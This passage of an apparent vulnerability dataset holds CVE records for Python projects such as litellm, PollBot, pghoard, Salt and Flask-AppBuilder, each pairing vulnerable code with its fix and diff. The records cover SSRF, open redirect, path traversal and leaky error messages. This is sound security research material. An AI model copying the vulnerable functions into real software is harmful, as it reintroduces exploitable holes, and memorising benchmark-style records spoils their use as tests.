    "vul_patch": "--- a/code/autocomplete/rtxcomplete.py\n+++ b/code/autocomplete/rtxcomplete.py\n@@ -10,6 +10,9 @@\n \n     if len(word) < 2:\n         return values\n+\n+    #### Try to avoid SQL injection exploits by sanitizing input #1823\n+    word = word.replace('\"','')\n \n     floor = word[:-1]\n     ceiling = floor + 'zz'\n@@ -75,8 +78,12 @@\n         if found_fragment is None:\n \n             #### Cache this fragment in the database\n-            cursor.execute(\"INSERT INTO cached_fragments(fragment) VALUES(?)\", (word,))\n-            fragment_id = cursor.lastrowid\n+            try:\n+                cursor.execute(\"INSERT INTO cached_fragments(fragment) VALUES(?)\", (word,))\n+                fragment_id = cursor.lastrowid\n+            except:\n+                print(f\"ERROR: Unable to INSERT into cached_fragments(fragment)\",file=sys.stderr)\n+                fragment_id = 0\n             if debug:\n                 print(f\"fragment_id = {fragment_id}\")\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-6587",
    "cve_description": "A Server-Side Request Forgery (SSRF) vulnerability exists in berriai/litellm version 1.38.10. This vulnerability allows users to specify the `api_base` parameter when making requests to `POST /chat/completions`, causing the application to send the request to the domain specified by `api_base`. This request includes the OpenAI API key. A malicious user can set the `api_base` to their own domain and intercept the OpenAI API key, leading to unauthorized access and potential misuse of the API key.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/berriai/litellm",
    "patch_url": [
      "https://github.com/berriai/litellm/commit/ba1912afd1b19e38d3704bb156adf887f91ae1e0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_164_1",
        "commit": "0b9782a",
        "file_path": "litellm/proxy/auth/auth_checks.py",
        "start_line": 43,
        "end_line": 202,
        "snippet": "def common_checks(\n    request_body: dict,\n    team_object: Optional[LiteLLM_TeamTable],\n    user_object: Optional[LiteLLM_UserTable],\n    end_user_object: Optional[LiteLLM_EndUserTable],\n    global_proxy_spend: Optional[float],\n    general_settings: dict,\n    route: str,\n) -> bool:\n    \"\"\"\n    Common checks across jwt + key-based auth.\n\n    1. If team is blocked\n    2. If team can call model\n    3. If team is in budget\n    4. If user passed in (JWT or key.user_id) - is in budget\n    5. If end_user (either via JWT or 'user' passed to /chat/completions, /embeddings endpoint) is in budget\n    6. [OPTIONAL] If 'enforce_end_user' enabled - did developer pass in 'user' param for openai endpoints\n    7. [OPTIONAL] If 'litellm.max_budget' is set (>0), is proxy under budget\n    8. [OPTIONAL] If guardrails modified - is request allowed to change this\n    \"\"\"\n    _model = request_body.get(\"model\", None)\n    if team_object is not None and team_object.blocked is True:\n        raise Exception(\n            f\"Team={team_object.team_id} is blocked. Update via `/team/unblock` if your admin.\"\n        )\n    # 2. If team can call model\n    if (\n        _model is not None\n        and team_object is not None\n        and len(team_object.models) > 0\n        and _model not in team_object.models\n    ):\n        # this means the team has access to all models on the proxy\n        if (\n            \"all-proxy-models\" in team_object.models\n            or \"*\" in team_object.models\n            or \"openai/*\" in team_object.models\n        ):\n            # this means the team has access to all models on the proxy\n            pass\n        # check if the team model is an access_group\n        elif model_in_access_group(_model, team_object.models) is True:\n            pass\n        elif _model and \"*\" in _model:\n            pass\n        else:\n            raise Exception(\n                f\"Team={team_object.team_id} not allowed to call model={_model}. Allowed team models = {team_object.models}\"\n            )\n    # 3. If team is in budget\n    if (\n        team_object is not None\n        and team_object.max_budget is not None\n        and team_object.spend is not None\n        and team_object.spend > team_object.max_budget\n    ):\n        raise litellm.BudgetExceededError(\n            current_cost=team_object.spend,\n            max_budget=team_object.max_budget,\n            message=f\"Team={team_object.team_id} over budget. Spend={team_object.spend}, Budget={team_object.max_budget}\",\n        )\n    # 4. If user is in budget\n    ## 4.1 check personal budget, if personal key\n    if (\n        (team_object is None or team_object.team_id is None)\n        and user_object is not None\n        and user_object.max_budget is not None\n    ):\n        user_budget = user_object.max_budget\n        if user_budget < user_object.spend:\n            raise litellm.BudgetExceededError(\n                current_cost=user_object.spend,\n                max_budget=user_budget,\n                message=f\"ExceededBudget: User={user_object.user_id} over budget. Spend={user_object.spend}, Budget={user_budget}\",\n            )\n    ## 4.2 check team member budget, if team key\n    # 5. If end_user ('user' passed to /chat/completions, /embeddings endpoint) is in budget\n    if end_user_object is not None and end_user_object.litellm_budget_table is not None:\n        end_user_budget = end_user_object.litellm_budget_table.max_budget\n        if end_user_budget is not None and end_user_object.spend > end_user_budget:\n            raise litellm.BudgetExceededError(\n                current_cost=end_user_object.spend,\n                max_budget=end_user_budget,\n                message=f\"ExceededBudget: End User={end_user_object.user_id} over budget. Spend={end_user_object.spend}, Budget={end_user_budget}\",\n            )\n    # 6. [OPTIONAL] If 'enforce_user_param' enabled - did developer pass in 'user' param for openai endpoints\n    if (\n        general_settings.get(\"enforce_user_param\", None) is not None\n        and general_settings[\"enforce_user_param\"] == True\n    ):\n        if is_llm_api_route(route=route) and \"user\" not in request_body:\n            raise Exception(\n                f\"'user' param not passed in. 'enforce_user_param'={general_settings['enforce_user_param']}\"\n            )\n    if general_settings.get(\"enforced_params\", None) is not None:\n        # Enterprise ONLY Feature\n        # we already validate if user is premium_user when reading the config\n        # Add an extra premium_usercheck here too, just incase\n        from litellm.proxy.proxy_server import CommonProxyErrors, premium_user\n\n        if premium_user is not True:\n            raise ValueError(\n                \"Trying to use `enforced_params`\"\n                + CommonProxyErrors.not_premium_user.value\n            )\n\n        if is_llm_api_route(route=route):\n            # loop through each enforced param\n            # example enforced_params ['user', 'metadata', 'metadata.generation_name']\n            for enforced_param in general_settings[\"enforced_params\"]:\n                _enforced_params = enforced_param.split(\".\")\n                if len(_enforced_params) == 1:\n                    if _enforced_params[0] not in request_body:\n                        raise ValueError(\n                            f\"BadRequest please pass param={_enforced_params[0]} in request body. This is a required param\"\n                        )\n                elif len(_enforced_params) == 2:\n                    # this is a scenario where user requires request['metadata']['generation_name'] to exist\n                    if _enforced_params[0] not in request_body:\n                        raise ValueError(\n                            f\"BadRequest please pass param={_enforced_params[0]} in request body. This is a required param\"\n                        )\n                    if _enforced_params[1] not in request_body[_enforced_params[0]]:\n                        raise ValueError(\n                            f\"BadRequest please pass param=[{_enforced_params[0]}][{_enforced_params[1]}] in request body. This is a required param\"\n                        )\n\n        pass\n    # 7. [OPTIONAL] If 'litellm.max_budget' is set (>0), is proxy under budget\n    if (\n        litellm.max_budget > 0\n        and global_proxy_spend is not None\n        # only run global budget checks for OpenAI routes\n        # Reason - the Admin UI should continue working if the proxy crosses it's global budget\n        and is_llm_api_route(route=route)\n        and route != \"/v1/models\"\n        and route != \"/models\"\n    ):\n        if global_proxy_spend > litellm.max_budget:\n            raise litellm.BudgetExceededError(\n                current_cost=global_proxy_spend, max_budget=litellm.max_budget\n            )\n\n    _request_metadata: dict = request_body.get(\"metadata\", {}) or {}\n    if _request_metadata.get(\"guardrails\"):\n        # check if team allowed to modify guardrails\n        from litellm.proxy.guardrails.guardrail_helpers import can_modify_guardrails\n\n        can_modify: bool = can_modify_guardrails(team_object)\n        if can_modify is False:\n            from fastapi import HTTPException\n\n            raise HTTPException(\n                status_code=403,\n                detail={\n                    \"error\": \"Your team does not have permission to modify guardrails.\"\n                },\n            )\n    return True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_164_2",
        "commit": "ba1912a",
        "file_path": "litellm/proxy/auth/auth_checks.py",
        "start_line": 43,
        "end_line": 56,
        "snippet": "def is_request_body_safe(request_body: dict) -> bool:\n    \"\"\"\n    Check if the request body is safe.\n\n    A malicious user can set the \\ufeffapi_base to their own domain and invoke POST /chat/completions to intercept and steal the OpenAI API key.\n    Relevant issue: https://huntr.com/bounties/4001e1a2-7b7a-4776-a3ae-e6692ec3d997\n    \"\"\"\n    banned_params = [\"api_base\", \"base_url\"]\n\n    for param in banned_params:\n        if param in request_body:\n            raise ValueError(f\"BadRequest: {param} is not allowed in request body\")\n\n    return True"
      },
      {
        "id": "fix_py_164_1",
        "commit": "ba1912a",
        "file_path": "litellm/proxy/auth/auth_checks.py",
        "start_line": 59,
        "end_line": 220,
        "snippet": "def common_checks(\n    request_body: dict,\n    team_object: Optional[LiteLLM_TeamTable],\n    user_object: Optional[LiteLLM_UserTable],\n    end_user_object: Optional[LiteLLM_EndUserTable],\n    global_proxy_spend: Optional[float],\n    general_settings: dict,\n    route: str,\n) -> bool:\n    \"\"\"\n    Common checks across jwt + key-based auth.\n\n    1. If team is blocked\n    2. If team can call model\n    3. If team is in budget\n    4. If user passed in (JWT or key.user_id) - is in budget\n    5. If end_user (either via JWT or 'user' passed to /chat/completions, /embeddings endpoint) is in budget\n    6. [OPTIONAL] If 'enforce_end_user' enabled - did developer pass in 'user' param for openai endpoints\n    7. [OPTIONAL] If 'litellm.max_budget' is set (>0), is proxy under budget\n    8. [OPTIONAL] If guardrails modified - is request allowed to change this\n    9. Check if request body is safe\n    \"\"\"\n    _model = request_body.get(\"model\", None)\n    if team_object is not None and team_object.blocked is True:\n        raise Exception(\n            f\"Team={team_object.team_id} is blocked. Update via `/team/unblock` if your admin.\"\n        )\n    # 2. If team can call model\n    if (\n        _model is not None\n        and team_object is not None\n        and len(team_object.models) > 0\n        and _model not in team_object.models\n    ):\n        # this means the team has access to all models on the proxy\n        if (\n            \"all-proxy-models\" in team_object.models\n            or \"*\" in team_object.models\n            or \"openai/*\" in team_object.models\n        ):\n            # this means the team has access to all models on the proxy\n            pass\n        # check if the team model is an access_group\n        elif model_in_access_group(_model, team_object.models) is True:\n            pass\n        elif _model and \"*\" in _model:\n            pass\n        else:\n            raise Exception(\n                f\"Team={team_object.team_id} not allowed to call model={_model}. Allowed team models = {team_object.models}\"\n            )\n    # 3. If team is in budget\n    if (\n        team_object is not None\n        and team_object.max_budget is not None\n        and team_object.spend is not None\n        and team_object.spend > team_object.max_budget\n    ):\n        raise litellm.BudgetExceededError(\n            current_cost=team_object.spend,\n            max_budget=team_object.max_budget,\n            message=f\"Team={team_object.team_id} over budget. Spend={team_object.spend}, Budget={team_object.max_budget}\",\n        )\n    # 4. If user is in budget\n    ## 4.1 check personal budget, if personal key\n    if (\n        (team_object is None or team_object.team_id is None)\n        and user_object is not None\n        and user_object.max_budget is not None\n    ):\n        user_budget = user_object.max_budget\n        if user_budget < user_object.spend:\n            raise litellm.BudgetExceededError(\n                current_cost=user_object.spend,\n                max_budget=user_budget,\n                message=f\"ExceededBudget: User={user_object.user_id} over budget. Spend={user_object.spend}, Budget={user_budget}\",\n            )\n    ## 4.2 check team member budget, if team key\n    # 5. If end_user ('user' passed to /chat/completions, /embeddings endpoint) is in budget\n    if end_user_object is not None and end_user_object.litellm_budget_table is not None:\n        end_user_budget = end_user_object.litellm_budget_table.max_budget\n        if end_user_budget is not None and end_user_object.spend > end_user_budget:\n            raise litellm.BudgetExceededError(\n                current_cost=end_user_object.spend,\n                max_budget=end_user_budget,\n                message=f\"ExceededBudget: End User={end_user_object.user_id} over budget. Spend={end_user_object.spend}, Budget={end_user_budget}\",\n            )\n    # 6. [OPTIONAL] If 'enforce_user_param' enabled - did developer pass in 'user' param for openai endpoints\n    if (\n        general_settings.get(\"enforce_user_param\", None) is not None\n        and general_settings[\"enforce_user_param\"] == True\n    ):\n        if is_llm_api_route(route=route) and \"user\" not in request_body:\n            raise Exception(\n                f\"'user' param not passed in. 'enforce_user_param'={general_settings['enforce_user_param']}\"\n            )\n    if general_settings.get(\"enforced_params\", None) is not None:\n        # Enterprise ONLY Feature\n        # we already validate if user is premium_user when reading the config\n        # Add an extra premium_usercheck here too, just incase\n        from litellm.proxy.proxy_server import CommonProxyErrors, premium_user\n\n        if premium_user is not True:\n            raise ValueError(\n                \"Trying to use `enforced_params`\"\n                + CommonProxyErrors.not_premium_user.value\n            )\n\n        if is_llm_api_route(route=route):\n            # loop through each enforced param\n            # example enforced_params ['user', 'metadata', 'metadata.generation_name']\n            for enforced_param in general_settings[\"enforced_params\"]:\n                _enforced_params = enforced_param.split(\".\")\n                if len(_enforced_params) == 1:\n                    if _enforced_params[0] not in request_body:\n                        raise ValueError(\n                            f\"BadRequest please pass param={_enforced_params[0]} in request body. This is a required param\"\n                        )\n                elif len(_enforced_params) == 2:\n                    # this is a scenario where user requires request['metadata']['generation_name'] to exist\n                    if _enforced_params[0] not in request_body:\n                        raise ValueError(\n                            f\"BadRequest please pass param={_enforced_params[0]} in request body. This is a required param\"\n                        )\n                    if _enforced_params[1] not in request_body[_enforced_params[0]]:\n                        raise ValueError(\n                            f\"BadRequest please pass param=[{_enforced_params[0]}][{_enforced_params[1]}] in request body. This is a required param\"\n                        )\n\n        pass\n    # 7. [OPTIONAL] If 'litellm.max_budget' is set (>0), is proxy under budget\n    if (\n        litellm.max_budget > 0\n        and global_proxy_spend is not None\n        # only run global budget checks for OpenAI routes\n        # Reason - the Admin UI should continue working if the proxy crosses it's global budget\n        and is_llm_api_route(route=route)\n        and route != \"/v1/models\"\n        and route != \"/models\"\n    ):\n        if global_proxy_spend > litellm.max_budget:\n            raise litellm.BudgetExceededError(\n                current_cost=global_proxy_spend, max_budget=litellm.max_budget\n            )\n\n    _request_metadata: dict = request_body.get(\"metadata\", {}) or {}\n    if _request_metadata.get(\"guardrails\"):\n        # check if team allowed to modify guardrails\n        from litellm.proxy.guardrails.guardrail_helpers import can_modify_guardrails\n\n        can_modify: bool = can_modify_guardrails(team_object)\n        if can_modify is False:\n            from fastapi import HTTPException\n\n            raise HTTPException(\n                status_code=403,\n                detail={\n                    \"error\": \"Your team does not have permission to modify guardrails.\"\n                },\n            )\n    is_request_body_safe(request_body=request_body)\n    return True"
      }
    ],
    "vul_patch": "--- a/litellm/proxy/auth/auth_checks.py\n+++ b/litellm/proxy/auth/auth_checks.py\n@@ -18,6 +18,7 @@\n     6. [OPTIONAL] If 'enforce_end_user' enabled - did developer pass in 'user' param for openai endpoints\n     7. [OPTIONAL] If 'litellm.max_budget' is set (>0), is proxy under budget\n     8. [OPTIONAL] If guardrails modified - is request allowed to change this\n+    9. Check if request body is safe\n     \"\"\"\n     _model = request_body.get(\"model\", None)\n     if team_object is not None and team_object.blocked is True:\n@@ -157,4 +158,5 @@\n                     \"error\": \"Your team does not have permission to modify guardrails.\"\n                 },\n             )\n+    is_request_body_safe(request_body=request_body)\n     return True\n\n--- /dev/null\n+++ b/litellm/proxy/auth/auth_checks.py\n@@ -0,0 +1,14 @@\n+def is_request_body_safe(request_body: dict) -> bool:\n+    \"\"\"\n+    Check if the request body is safe.\n+\n+    A malicious user can set the \\ufeffapi_base to their own domain and invoke POST /chat/completions to intercept and steal the OpenAI API key.\n+    Relevant issue: https://huntr.com/bounties/4001e1a2-7b7a-4776-a3ae-e6692ec3d997\n+    \"\"\"\n+    banned_params = [\"api_base\", \"base_url\"]\n+\n+    for param in banned_params:\n+        if param in request_body:\n+            raise ValueError(f\"BadRequest: {param} is not allowed in request body\")\n+\n+    return True\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0637",
    "cve_description": "open redirect in pollbot (pollbot.services.mozilla.com) in versions before 1.4.6",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/mozilla/PollBot",
    "patch_url": [
      "https://github.com/mozilla/PollBot/commit/e39d8bec2df582ba525bb2e2f33c3ebc584d7ff8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_217_1",
        "commit": "5c05a73",
        "file_path": "pollbot/middlewares.py",
        "start_line": 61,
        "end_line": 69,
        "snippet": "async def handle_404(request, response):\n    if 'json' not in response.headers['Content-Type']:\n        if request.path.endswith('/'):\n            return web.HTTPFound('/' + request.path.strip('/'))\n        return web.json_response({\n            \"status\": 404,\n            \"message\": \"Page '{}' not found\".format(request.path)\n        }, status=404)\n    return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_217_1",
        "commit": "e39d8be",
        "file_path": "pollbot/middlewares.py",
        "start_line": 62,
        "end_line": 74,
        "snippet": "async def handle_404(request, response):\n    if 'json' not in response.headers['Content-Type']:\n        # This traling slash redirect has caused security issues.\n        # If it continues to be problematic, consider:\n        #  - only redirect \"/v1/.../\"?\n        #  - remove the redirect entirely; use duplicate routes instead, in app.py\n        if request.path.endswith('/'):\n            return web.HTTPFound('/' + request.path.strip('/'+string.whitespace))\n        return web.json_response({\n            \"status\": 404,\n            \"message\": \"Page '{}' not found\".format(request.path)\n        }, status=404)\n    return response"
      }
    ],
    "vul_patch": "--- a/pollbot/middlewares.py\n+++ b/pollbot/middlewares.py\n@@ -1,7 +1,11 @@\n async def handle_404(request, response):\n     if 'json' not in response.headers['Content-Type']:\n+        # This traling slash redirect has caused security issues.\n+        # If it continues to be problematic, consider:\n+        #  - only redirect \"/v1/.../\"?\n+        #  - remove the redirect entirely; use duplicate routes instead, in app.py\n         if request.path.endswith('/'):\n-            return web.HTTPFound('/' + request.path.strip('/'))\n+            return web.HTTPFound('/' + request.path.strip('/'+string.whitespace))\n         return web.json_response({\n             \"status\": 404,\n             \"message\": \"Page '{}' not found\".format(request.path)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-56142",
    "cve_description": "pghoard is a PostgreSQL backup daemon and restore tooling that stores backup data in cloud object stores. A vulnerability has been discovered that could allow an attacker to acquire disk access with privileges equivalent to those of pghoard, allowing for unintended path traversal. Depending on the permissions/privileges assigned to pghoard, this could allow disclosure of sensitive information. This issue has been addressed in releases after 2.2.2a. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/Aiven-Open/pghoard",
    "patch_url": [
      "https://github.com/Aiven-Open/pghoard/commit/fe9947642cc73bcacf6d19b93eb98f442223fb47"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_316_1",
        "commit": "b93b132",
        "file_path": "pghoard/webserver.py",
        "start_line": "604",
        "end_line": "662",
        "snippet": "    def handle_archival_request(self, site, filename, filetype):\n        if filetype == \"basebackup\":\n            # Request a basebackup to be made for site\n            self.server.log.debug(\"Requesting a new basebackup for site: %r to be made\", site)\n            self.server.requested_basebackup_sites.add(site)\n            raise HttpResponse(status=201)\n\n        start_time = time.time()\n\n        site_config = self.server.config[\"backup_sites\"][site]\n        xlog_dir = get_pg_wal_directory(site_config)\n        xlog_path = os.path.join(xlog_dir, filename)\n        self.server.log.debug(\"Got request to archive: %r %r %r, %r\", site, filetype, filename, xlog_path)\n        if not os.path.exists(xlog_path):\n            self.server.log.debug(\"xlog_path: %r did not exist, cannot archive, returning 404\", xlog_path)\n            raise HttpResponse(\"N/A\", status=404)\n\n        if filetype == \"xlog\":\n            try:\n                wal.verify_wal(wal_name=filename, filepath=xlog_path)\n            except ValueError as ex:\n                raise HttpResponse(str(ex), status=412)\n\n        callback_queue = Queue()\n        if not self.server.config[\"backup_sites\"][site][\"object_storage\"]:\n            compress_to_memory = False\n        else:\n            compress_to_memory = True\n        if filename.endswith(\".history\"):\n            filetype = FileType.Timeline\n        else:\n            filetype = FileType.Wal\n        compression_event = CompressionEvent(\n            callback_queue=callback_queue,\n            compress_to_memory=compress_to_memory,\n            delete_file_after_compression=False,\n            file_path=FileTypePrefixes[filetype] / filename,\n            source_data=Path(xlog_path),\n            file_type=filetype,\n            backup_site_name=site,\n            metadata={}\n        )\n        self.server.compression_queue.put(compression_event)\n        try:\n            response = callback_queue.get(timeout=30)\n            self.server.log.debug(\n                \"Handled an archival request for: %r %r, took: %.3fs\", site, xlog_path,\n                time.time() - start_time\n            )\n        except Empty:\n            self.server.log.exception(\n                \"Problem in getting a response in time, returning 404, took: %.2fs\",\n                time.time() - start_time\n            )\n            raise HttpResponse(\"TIMEOUT\", status=500)\n\n        if not response.success:\n            raise HttpResponse(status=500)\n        raise HttpResponse(status=201)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_316_1",
        "commit": "fe99476",
        "file_path": "pghoard/webserver.py",
        "start_line": "610",
        "end_line": "668",
        "snippet": "    def handle_archival_request(self, site, filename, filetype):\n        if filetype == \"basebackup\":\n            # Request a basebackup to be made for site\n            self.server.log.debug(\"Requesting a new basebackup for site: %r to be made\", site)\n            self.server.requested_basebackup_sites.add(site)\n            raise HttpResponse(status=201)\n\n        start_time = time.time()\n\n        site_config = self.server.config[\"backup_sites\"][site]\n        xlog_dir = get_pg_wal_directory(site_config)\n        xlog_path = os.path.join(xlog_dir, filename)\n        self.server.log.debug(\"Got request to archive: %r %r %r, %r\", site, filetype, filename, xlog_path)\n        if not self._is_valid_xlog_path(xlog_path):\n            self.server.log.debug(\"xlog_path: %r did not exist or contains symlinks, cannot archive, returning 404\", xlog_path)\n            raise HttpResponse(\"N/A\", status=404)\n\n        if filetype == \"xlog\":\n            try:\n                wal.verify_wal(wal_name=filename, filepath=xlog_path)\n            except ValueError as ex:\n                raise HttpResponse(str(ex), status=412)\n\n        callback_queue = Queue()\n        if not self.server.config[\"backup_sites\"][site][\"object_storage\"]:\n            compress_to_memory = False\n        else:\n            compress_to_memory = True\n        if filename.endswith(\".history\"):\n            filetype = FileType.Timeline\n        else:\n            filetype = FileType.Wal\n        compression_event = CompressionEvent(\n            callback_queue=callback_queue,\n            compress_to_memory=compress_to_memory,\n            delete_file_after_compression=False,\n            file_path=FileTypePrefixes[filetype] / filename,\n            source_data=Path(xlog_path),\n            file_type=filetype,\n            backup_site_name=site,\n            metadata={}\n        )\n        self.server.compression_queue.put(compression_event)\n        try:\n            response = callback_queue.get(timeout=30)\n            self.server.log.debug(\n                \"Handled an archival request for: %r %r, took: %.3fs\", site, xlog_path,\n                time.time() - start_time\n            )\n        except Empty:\n            self.server.log.exception(\n                \"Problem in getting a response in time, returning 404, took: %.2fs\",\n                time.time() - start_time\n            )\n            raise HttpResponse(\"TIMEOUT\", status=500)\n\n        if not response.success:\n            raise HttpResponse(status=500)\n        raise HttpResponse(status=201)"
      },
      {
        "id": "fix_py_316_2",
        "commit": "fe99476",
        "file_path": "pghoard/webserver.py",
        "start_line": "514",
        "end_line": "517",
        "snippet": "    @staticmethod\n    def _is_valid_xlog_path(xlog_path_str: str) -> bool:\n        xlog_path = Path(xlog_path_str)\n        return xlog_path.is_file() and not xlog_path.is_symlink()"
      }
    ],
    "vul_patch": "--- a/pghoard/webserver.py\n+++ b/pghoard/webserver.py\n@@ -11,8 +11,8 @@\n         xlog_dir = get_pg_wal_directory(site_config)\n         xlog_path = os.path.join(xlog_dir, filename)\n         self.server.log.debug(\"Got request to archive: %r %r %r, %r\", site, filetype, filename, xlog_path)\n-        if not os.path.exists(xlog_path):\n-            self.server.log.debug(\"xlog_path: %r did not exist, cannot archive, returning 404\", xlog_path)\n+        if not self._is_valid_xlog_path(xlog_path):\n+            self.server.log.debug(\"xlog_path: %r did not exist or contains symlinks, cannot archive, returning 404\", xlog_path)\n             raise HttpResponse(\"N/A\", status=404)\n \n         if filetype == \"xlog\":\n\n--- /dev/null\n+++ b/pghoard/webserver.py\n@@ -0,0 +1,4 @@\n+    @staticmethod\n+    def _is_valid_xlog_path(xlog_path_str: str) -> bool:\n+        xlog_path = Path(xlog_path_str)\n+        return xlog_path.is_file() and not xlog_path.is_symlink()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-14695",
    "cve_description": "Directory traversal vulnerability in minion id validation in SaltStack Salt before 2016.3.8, 2016.11.x before 2016.11.8, and 2017.7.x before 2017.7.2 allows remote minions with incorrect credentials to authenticate to a master via a crafted minion ID.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2017-12791.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/saltstack/salt",
    "patch_url": [
      "https://github.com/saltstack/salt/commit/80d90307b07b3703428ecbb7c8bb468e28a9ae6d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_383_1",
        "commit": "5f8b5e1a0f23fe0f2be5b3c3e04199b57a53db5b",
        "file_path": "salt/utils/verify.py",
        "start_line": 492,
        "end_line": 499,
        "snippet": "def valid_id(opts, id_):\n    '''\n    Returns if the passed id is valid\n    '''\n    try:\n        return bool(clean_path(opts['pki_dir'], id_)) and clean_id(id_)\n    except (AttributeError, KeyError, TypeError) as e:\n        return False"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_383_1",
        "commit": "80d90307b07b3703428ecbb7c8bb468e28a9ae6d",
        "file_path": "salt/utils/verify.py",
        "start_line": 483,
        "end_line": 492,
        "snippet": "def valid_id(opts, id_):\n    '''\n    Returns if the passed id is valid\n    '''\n    try:\n        if any(x in id_ for x in ('/', '\\\\', '\\0')):\n            return False\n        return bool(clean_path(opts['pki_dir'], id_))\n    except (AttributeError, KeyError, TypeError):\n        return False"
      }
    ],
    "vul_patch": "--- a/salt/utils/verify.py\n+++ b/salt/utils/verify.py\n@@ -3,6 +3,8 @@\n     Returns if the passed id is valid\n     '''\n     try:\n-        return bool(clean_path(opts['pki_dir'], id_)) and clean_id(id_)\n-    except (AttributeError, KeyError, TypeError) as e:\n+        if any(x in id_ for x in ('/', '\\\\', '\\0')):\n+            return False\n+        return bool(clean_path(opts['pki_dir'], id_))\n+    except (AttributeError, KeyError, TypeError):\n         return False\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-34110",
    "cve_description": "Flask-AppBuilder is an application development framework, built on top of Flask. Prior to version 4.3.2, an authenticated malicious actor with Admin privileges, could by adding a special character on the add, edit User forms trigger a database error, this error is surfaced back to this actor on the UI. On certain database engines this error can include the entire user row including the pbkdf2:sha256 hashed password. This vulnerability has been fixed in version 4.3.2.\n",
    "cwe_info": {
      "CWE-209": {
        "name": "Generation of Error Message Containing Sensitive Information",
        "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
      }
    },
    "repo": "https://github.com/dpgaspar/Flask-AppBuilder",
    "patch_url": [
      "https://github.com/dpgaspar/Flask-AppBuilder/commit/ae25ad4c87a9051ebe4a4e8f02aee73232642626"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_421_1",
        "commit": "98e3808",
        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 725,
        "end_line": 747,
        "snippet": "    def add(self, item: Model, raise_exception: bool = False) -> bool:\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False\n        except Exception as e:\n            self.message = (\n                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n                \"danger\",\n            )\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False"
      },
      {
        "id": "vul_py_421_2",
        "commit": "98e3808",
        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 749,
        "end_line": 771,
        "snippet": "    def edit(self, item: Model, raise_exception: bool = False) -> bool:\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False\n        except Exception as e:\n            self.message = (\n                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n                \"danger\",\n            )\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            if raise_exception:\n                raise e\n            return False"
      },
      {
        "id": "vul_py_421_3",
        "commit": "98e3808",
        "file_path": "flask_appbuilder/models/sqla/interface.py",
        "start_line": 798,
        "end_line": 818,
        "snippet": "    def delete_all(self, items: List[Model]) -> bool:\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), \"success\")\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), \"warning\")\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (\n                as_unicode(self.general_error_message + \" \" + str(sys.exc_info()[0])),\n                \"danger\",\n            )\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False"
      },
      {
        "id": "vul_py_421_4",
        "commit": "98e3808",
